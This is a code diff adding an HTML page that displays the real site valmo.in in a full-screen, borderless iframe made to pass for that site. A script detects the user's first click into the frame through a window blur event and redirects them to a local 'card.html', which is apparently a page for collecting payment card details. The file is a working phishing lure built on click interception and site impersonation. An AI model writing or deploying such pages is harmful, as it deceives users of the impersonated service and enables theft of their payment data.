@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+<style>
+  body {
+  background: #171D57;
+  }
+    
+  
+  .ifram {
+  width: 100%;
+  height: 100vh;
+  }
+</style>
+<body>
+ 
+ 
+ 
+ <iframe id="externalIframe" onclick="test()"  class="ifram" src="https://www.valmo.in/" frameborder="0"></iframe> 
+ 
+
+<script>
+function go() {
+  window.location.href = "card.html";
+
+}
+window.addEventListener('blur', function() {
+  // Check if the iframe is what took the focus away
+  if (document.activeElement.tagName === 'IFRAME') {
+    
+    //alert("Iframe clicked!");
+    go();
+    // Reset focus to the main window to detect the next click
+    setTimeout(() => { window.focus(); }, 100);
+  }
+});
+</script>
+
+
+
+</body>
+
+</html>
